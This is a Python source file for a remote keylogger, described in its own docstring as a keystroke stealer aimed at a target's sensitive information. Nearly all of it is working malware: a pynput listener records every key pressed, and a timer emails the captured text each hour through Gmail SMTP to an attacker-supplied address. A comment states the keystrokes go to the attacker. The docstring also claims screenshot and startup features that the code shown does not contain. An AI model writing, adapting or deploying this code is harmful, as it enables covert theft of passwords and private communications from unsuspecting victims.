#!/usr/bin/env python3.11

"""
Script Name: Remote-Keylogger 
Author: Abedelrahman Adel Almorssy
Date: June 18, 2023
Description: This script is Keystrokes stealer (Keylogger) . 

Summary: 
This script is attempt to catch (Target) keystrokes attempting to steal importent information by parsing (Target) keystrokes . 

Dependencies:
- pynput library (version 1.7.6)
- smtplib library (version x.x.x) 
- contextlib library (version x.x.x)
- threading library (version x.x.x)

Features : 
- Store logs locally (local Keylogger) . 
- Report and send to email or remote server (remote Keylogger) . 
- Log screenshots . 
- Start with system startup . 

Usage:
- Make sure the pynput library is installed.
- Adjust the Keyboard and mouse (If needed) parameters according to your needs.
- Run the script to see the output.

Examples:
- There is no examples . 

Version History:
- 1.0.0 (June 18, 2023): Initial release

License: [Specify the license under which the script is released]
"""
from pynput import keyboard
from contextlib import suppress
from threading import Timer
from smtplib import SMTP


with suppress(KeyboardInterrupt):

    class TheLogger:
        def __init__(self) -> None:
            self.All_Keys: str = "Keylogger Attack Started !!!! "
            self.Waiting_Interval: int = 3600

        def KeysWriter(self, keystrok) -> None:
            try:
                self.All_Keys = self.All_Keys + str(keystrok.char)
            except AttributeError:
                if keystrok is keyboard.Key.space:
                    self.All_Keys = self.All_Keys + " "
                elif keystrok is keyboard.Key.backspace:
                    self.All_Keys = self.All_Keys + " backspace "
                else:
                    self.All_Keys = " " + str(self.All_Keys) + " "

        def Mail(self, msg: str) -> None:
            Mail_Server: SMTP = SMTP(host="smtp.gmail.com", port=587)
            Mail_Server.starttls()
            Mail_Server.login(user="Your@EmailAddress.com", password="Password")
            Mail_Server.sendmail(
                to_addrs="Destiantion@EmailAddress.com",
                from_addr="Source@EmailAddress.com",
                msg=msg,
            )
            Mail_Server.close()

        def Report(self) -> None:
            # todo :
            # Send Keystorks To Attacker Via Email .
            # Empty All_Keys Variable .
            # Start New Thread With A Timer .
            # Repeat .

            self.Mail(msg=self.All_Keys)
            self.All_Keys: str = ""
            __Timer: Timer = Timer(interval=self.Waiting_Interval, function=self.Report)
            __Timer.start()

        def Start(self) -> None:
            with keyboard.Listener(on_press=self.KeysWriter) as keyloger:
                self.Report()
                keyloger.join()

    log = TheLogger().Start()
